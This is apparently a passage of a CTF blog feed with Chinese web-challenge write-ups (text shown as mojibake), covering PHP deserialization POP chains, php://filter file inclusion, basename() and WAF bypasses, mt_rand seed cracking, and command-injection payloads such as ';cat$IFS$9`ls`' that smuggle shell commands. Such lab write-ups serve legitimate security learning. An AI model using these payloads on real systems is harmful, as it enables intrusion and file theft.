<p>NSSCTF{60cf6a40-176b-4555-8001-d99a70d1385e}</p>
<h2 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°è¿™ä¸€è¡Œ<code>include(&quot;flag.php&quot;);//here I changed those two</code></p>
<p>æ‰€ä»¥ç›´æ¥æ¯”è¾ƒä¸äº†ï¼Œæ‰€ä»¥è€ƒå¯Ÿäº†ä¸€ä¸ªphpç‰¹æ€§ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(null==0)   true</span><br><span class="line">if(flase==0)   true</span><br><span class="line">if(ture==&#x27;énull&#x27;)  true</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = [</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">];</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$info</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/reserved.variables.server.php">PHP: $_SERVER - Manual</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¡ˆä¾‹ç½‘å€ï¼šhttps://www.shawroot.cc/php/index.php/test/foo?username=root</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] 	å¾—åˆ°ï¼š/php/index.php/test/foo</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] å¾—åˆ°ï¼š/php/index.php/test/foo?username=root</span><br></pre></td></tr></table></figure>

<p>basename() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/testweb/home.php&quot;</span>;</span><br><span class="line"><span class="comment">//æ˜¾ç¤ºå¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„æ–‡ä»¶å</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="comment">//æ˜¾ç¤ºä¸å¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„æ–‡ä»¶å</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>,<span class="string">&quot;.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//è¾“å‡ºç¤ºä¾‹</span></span><br><span class="line">home.php</span><br><span class="line">home</span><br></pre></td></tr></table></figure>

<ul>
<li><p>å…¶ä¸­<code>$_SERVER[&#39;PHP_SELF&#39;]</code>çš„å€¼ä¼šåˆ°<code>basename()</code>å‡½æ•°ä¸­</p>
</li>
<li><p>å…¶ç»•è¿‡åŸç†ä¸ºï¼šåœ¨ä½¿ç”¨é»˜è®¤è¯­è¨€ç¯å¢ƒè®¾ç½®æ—¶ï¼Œ<code>basename()</code> ä¼šåˆ é™¤æ–‡ä»¶åå¼€å¤´çš„é ASCII å­—ç¬¦å’Œä¸­æ–‡ï¼Œ</p>
</li>
<li><p>è¿™å¯ä»¥ç”¨æ¥é€šè¿‡ä¸Šé¢çš„æ­£åˆ™è¿‡æ»¤</p>
<p> urlç¼–ç ç»•show_source</p>
</li>
<li><p>å› ä¸ºå½“æˆ‘ä»¬ä¼ å…¥<code>index.php/utils.php</code>æ—¶ï¼Œä»ç„¶è¯·æ±‚çš„æ˜¯<code>index.php</code>ï¼Œ</p>
</li>
<li><p>ä½†æ˜¯å½“<code>basename()</code>å¤„ç†åï¼Œ<code>highlight_file()</code>å¾—åˆ°çš„å‚æ•°å°±å˜æˆäº†<code>utils.php</code>ï¼Œä»è€Œæˆ‘ä»¬å°±å®ç°äº†ä»»æ„æ–‡ä»¶åŒ…å«</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/utils.php/%ff?%73how_source=1</span><br><span class="line">æˆ–è€…</span><br><span class="line">/index.php/utils.php/%ff?%73%68%6f%77%5f%73%6f%75%72%63%65=1</span><br></pre></td></tr></table></figure>

<h2 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h2><p>hint is hear Can you find out the hint.php?</p>
<p>getä¼ å‚ä¼ªåè®®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>

<p>PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4&#x3D;</p>
<p>è®¿é—®&#x2F;test2222222222222.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;max_execution_time&quot;, &quot;180&quot;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a= $_GET[&quot;a&quot;];</span><br><span class="line">if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;</span><br><span class="line">    echo &quot;success\n&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=data://text/plain,I want flag</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF-2019-Ping-Ping-Pingå·²è§£å†³"><a href="#GXYCTF-2019-Ping-Ping-Pingå·²è§£å†³" class="headerlink" title="[GXYCTF 2019]Ping Ping Pingå·²è§£å†³"></a>[GXYCTF 2019]Ping Ping Pingå·²è§£å†³</h2><p>è§£æ³•ä¸€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<p>è§£æ³•ä¸‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;a=ag;b=fl;tac$IFS$9$b$a.php</span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-checkin"><a href="#NISACTF-2022-checkin" class="headerlink" title="[NISACTF 2022]checkin"></a>[NISACTF 2022]checkin</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">// â€®â¦NISACTFâ©â¦Welcome to</span><br><span class="line">if (&quot;jitanglailo&quot; == $_GET[ahahahaha] &amp;â€®â¦+!!â©â¦&amp; &quot;â€®â¦ Flag!â©â¦N1SACTF&quot; == $_GET[â€®â¦Ugeiwoâ©â¦cuishiyuan]) &#123; //tnnd! weishenme b</span><br><span class="line">    echo $FLAG;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸å¯è§å­—ç¬¦ï¼Œunicodeå­—ç¬¦</p>
<p>å¤åˆ¶åˆ°txtæ–‡æ¡£ä¸­010æ‰“å¼€åå°±æå–16è¿›åˆ¶æ›¿æ¢ç©ºæ ¼ä¸ºç™¾åˆ†å·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6%20Flag%21%E2%81%A9%E2%81%A6N1SACTF</span><br></pre></td></tr></table></figure>

<h2 id="GKCTF-2020-cveç‰ˆç­¾åˆ°"><a href="#GKCTF-2020-cveç‰ˆç­¾åˆ°" class="headerlink" title="[GKCTF 2020]cveç‰ˆç­¾åˆ°"></a>[GKCTF 2020]cveç‰ˆç­¾åˆ°</h2><h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-pop"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-pop" class="headerlink" title="SWPUCTF 2021 æ–°ç”Ÿèµ›]pop"></a>SWPUCTF 2021 æ–°ç”Ÿèµ›]pop</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m;</span><br><span class="line">$b=new w33m;</span><br><span class="line">$c=new w44m;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$b-&gt;w22m=&#x27;Getflag&#x27;;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h2 id="é¹åŸæ¯-2022-ç®€å•åŒ…å«"><a href="#é¹åŸæ¯-2022-ç®€å•åŒ…å«" class="headerlink" title="[é¹åŸæ¯ 2022]ç®€å•åŒ…å«"></a>[é¹åŸæ¯ 2022]ç®€å•åŒ…å«</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include($_POST[&quot;flag&quot;]);</span><br><span class="line">//flag in /var/www/html/flag.php;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = $_POST[&quot;flag&quot;];</span><br><span class="line">if (strlen(file_get_contents(&#x27;php://input&#x27;)) &lt; 800 &amp;&amp; preg_match(&#x27;/flag/&#x27;, $path)) &#123;</span><br><span class="line">    echo &#x27;nssctf waf!&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @include($path);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>postå†…å®¹å¤§äº800å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åƒåœ¾æ•°æ®&amp;flag=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>-nss</tag>
      </tags>
  </entry>
  <entry>
    <title>çˆ†ç ´</title>
    <url>/2023/04/29/%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<p>ctfshow çˆ†ç ´</p>
<span id="more"></span>

<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;token&#x27;]))&#123;</span><br><span class="line">    $token = md5($_GET[&#x27;token&#x27;]);</span><br><span class="line">    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;</span><br><span class="line">        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$token</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>j</span><br></pre></td></tr></table></figure>

<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(372619038);</span><br><span class="line">    if(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_srand() //æ’­ç§ Mersenne Twister éšæœºæ•°ç”Ÿæˆå™¨ã€‚</span><br><span class="line">mt_rand()   //ç”Ÿæˆéšæœºæ•°</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¼šå‘ç°å½“ç§å­ä¸å˜æ—¶ï¼Œå®é™…ä¸Šç”Ÿæˆçš„éšæœºæ•°æ˜¯å›ºå®šçš„ã€‚è€Œè¿™å°±æ˜¯ä¼ªéšæœºæ•°æ¼æ´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(372619038);</span><br><span class="line">echo (mt_rand());</span><br><span class="line">1155388967</span><br></pre></td></tr></table></figure>

<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), 0,8)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    if((!$rand))&#123;</span><br><span class="line">        if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å·²çŸ¥éšæœºæ•°çˆ†ç ´ç§å­</p>
<p>ä½¿ç”¨å·¥å…·<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker (openwall.com)</a></p>
<p><a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">php_mt_seed 4.0</a></p>
<p>ä¸‹è½½è§£å‹ï¼Œè¿›å…¥ç›®å½•</p>
<ul>
<li>make</li>
<li>time .&#x2F;php_mt_seed 989670016</li>
</ul>
<p><img src="/2023/04/29/%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20230501185137.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">2838855227</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="number">989670016</span></span><br><span class="line"><span class="number">3064661505</span></span><br></pre></td></tr></table></figure>

<p>&#x2F;?r&#x3D;989670016</p>
<p>cookie: token&#x3D;3064661505</p>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>çˆ†ç ´å³å¯</p>
<p>å¯†ç  7758521</p>
<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>æŠ“ä¸åˆ°åŒ…ã€‚ã€‚ã€‚å†™ä¸äº†</p>
<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p>ç»§ç»­çˆ†ç ´ä¸€ä¸‹ç›®å½•</p>
<p><code>[1cd8c3a3-5c30-4219-93aa-489569d67004.challenge.ctf.show/0/1/2.txt](http://1cd8c3a3-5c30-4219-93aa-489569d67004.challenge.ctf.show/0/1/2.txt)</code></p>
<p>å»æ‰2.txt</p>
<p>é›†æŸç‚¸å¼¹ cluster bomb çˆ†ç ´ä¸€ä¸€ä¸‹</p>
<p>çˆ†ç ´ç»“æœ&#x2F;72&#x2F;20&#x2F;</p>
<h2 id="ctfshowèŒæ–°æ¯web16"><a href="#ctfshowèŒæ–°æ¯web16" class="headerlink" title="ctfshowèŒæ–°æ¯web16"></a>ctfshowèŒæ–°æ¯web16</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">\<span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&quot;ctfshow<span class="subst">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯</p>
<p>mport hashlib #å»ºç«‹çˆ†ç ´çš„å­—å…¸str str&#x3D;â€™abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+-*&#x2F;â€˜ #ä»ä¸€ä¸ªå­—ç¬¦å¼€å§‹å°è¯•ï¼Œé€æ¸å¾€ä¸‹åŠ  for i in str: for j in str : for k in str: s&#x3D;hashlib.md5((â€˜ctfshowâ€™+i+j+k).encode()).hexdigest() #è®©ctfshowå’Œå­—ç¬¦i,j,kæ‹¼æ¥åœ¨ä¸€èµ·ï¼Œè½¬åŒ–ä¸ºMD5å€¼ï¼Œhexdigestå‡½æ•°å®ç°å­—ç¬¦å­˜å‚¨ if s&#x3D;&#x3D; â€˜a6f57ae38a22448c2f07f3f95f49c84eâ€™:#åˆ¤æ–­å€¼æ˜¯å¦ç¬¦åˆæ¡ä»¶ print(i+j+k)#è¾“å‡ºå­—ç¬¦cçš„å€¼ è„šæœ¬è¾“å‡º36d æ„é€ payload: ?c&#x3D;36d å¾—å‡ºflag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">payload=&#x27;&#x27;</span><br><span class="line">for i in str1:</span><br><span class="line">    for j in str1:</span><br><span class="line">        for k in str1:</span><br><span class="line">            s = hashlib.md5((&#x27;ctfshow&#x27;+i+j+k).encode()).hexdigest()</span><br><span class="line">            #print(type(s))</span><br><span class="line">            if s==&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;:</span><br><span class="line">                print(i+j+k)</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">a=string.ascii_letters+string.digits</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctfhsow</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliå·¥å…·</title>
    <url>/2023/04/03/kali%E5%B7%A5%E5%85%B7/</url>
